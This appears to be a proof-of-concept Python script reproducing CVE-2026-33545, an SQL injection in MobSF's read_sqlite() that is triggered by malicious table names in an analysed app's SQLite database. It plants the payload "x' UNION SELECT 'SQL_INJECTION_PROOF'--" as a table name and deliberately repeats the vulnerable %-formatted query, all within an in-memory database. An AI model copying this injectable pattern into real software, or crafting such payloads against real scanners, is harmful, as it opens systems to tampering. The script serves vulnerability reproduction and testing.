"""
CVE: CVE-2026-33545
Description: MobSF SQL injection in read_sqlite() via crafted table names from malicious APK
Source: https://nvd.nist.gov/vuln/detail/CVE-2026-33545
Pattern: MobSF's read_sqlite() in mobsf/MobSF/utils.py uses Python %-formatting to
         construct SQL queries with table names read from sqlite_master. When analyzing
         a malicious app's SQLite database, attacker-controlled table names (with SQL
         injection payloads) are interpolated directly into queries.
"""

import sqlite3


def vulnerable_mobsf_read_sqlite():
    conn = sqlite3.connect(":memory:")
    cur = conn.cursor()

    cur.executescript("""
        CREATE TABLE normal_data (id INTEGER, value TEXT);
        INSERT INTO normal_data VALUES (1, 'legitimate_data');
    """)

    malicious_table = "x' UNION SELECT 'SQL_INJECTION_PROOF'--"
    try:
        cur.execute(f"CREATE TABLE \"{malicious_table}\" (id INTEGER)")
        cur.execute("INSERT INTO \"%s\" VALUES (99)" % malicious_table)
    except sqlite3.OperationalError:
        pass

    cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
    tables = [row[0] for row in cur.fetchall()]

    for tbl in tables:
        try:
            query = "SELECT * FROM '%s'" % tbl
            cur.execute(query)
            rows = cur.fetchall()
            if rows:
                print(
                    f"[VULNERABLE CVE-2026-33545] MobSF read_sqlite() injection via table '{tbl}':"
                )
                for r in rows:
                    print(f"  {r}")
        except sqlite3.OperationalError as e:
            print(f"[DoS CONFIRMED] MobSF-style crash on table '{tbl}': {e}")

    conn.close()


if __name__ == "__main__":
    vulnerable_mobsf_read_sqlite()